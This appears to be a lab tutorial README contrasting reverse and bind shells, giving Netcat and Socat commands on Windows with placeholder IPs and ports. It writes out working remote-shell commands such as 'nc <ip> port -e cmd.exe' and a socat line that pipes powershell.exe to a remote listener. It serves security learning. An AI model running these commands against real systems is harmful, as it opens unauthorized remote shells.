# Netcat

Before moving ahead lets understand the basic difference between Reverse shell and Bind shell

The main difference that in rev shell and bind shell is that in rev shell you establish
the listner in your machine whereas in the bind shell the compromisded machine will establish the listener.

In to get a clear idea lets perform the task.. and see whats the real difference is


The one that we created in the prev task was a webshell :0

**Netcat For REV-SHELL**

Open the cmd using the administrators permissions now simply type the command :

    nc <ip> port -e "cmd.exe"

Before doing so make sure to open the listner in your own machine using `nc -lnvp <port>`

There we go..


![Screenshot 2023-11-18 135745](https://github.com/Theincognitomode/What-the-shell/assets/73027020/36fdbb08-7baa-4453-b088-03b523f62739)


This is a NETCAT reverse shell..


Now lets create a **Bind shell**

![Screenshot 2023-11-18 140805](https://github.com/Theincognitomode/What-the-shell/assets/73027020/5a439b6e-c16b-45e2-9c5a-5564b9022c0f)


Now you can see the difference 

# SOCAT


- Socat rev-shell 
We will be using this command for listner :(in our machine)

      socat TCP-L:<PORT> -

Go to windows and execute this command:

    socat TCP:<LOCAL IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes

![Screenshot 2023-11-18 142047](https://github.com/Theincognitomode/What-the-shell/assets/73027020/fc6aadc5-8fa7-4438-af13-3d9dfdb31e85)





There we gooo!!

- Socat bind shell

1. Commad:(in the compromised machine)

       socat TCP-L:<PORT> EXEC:powershell.exe,pipes

2. In your machine

       socat TCP:<LOCAL IP>:<LOCAL-PORT> -


![Screenshot 2023-11-18 142818](https://github.com/Theincognitomode/What-the-shell/assets/73027020/2ef37e89-da21-42d0-bf68-13a454a5f17a)


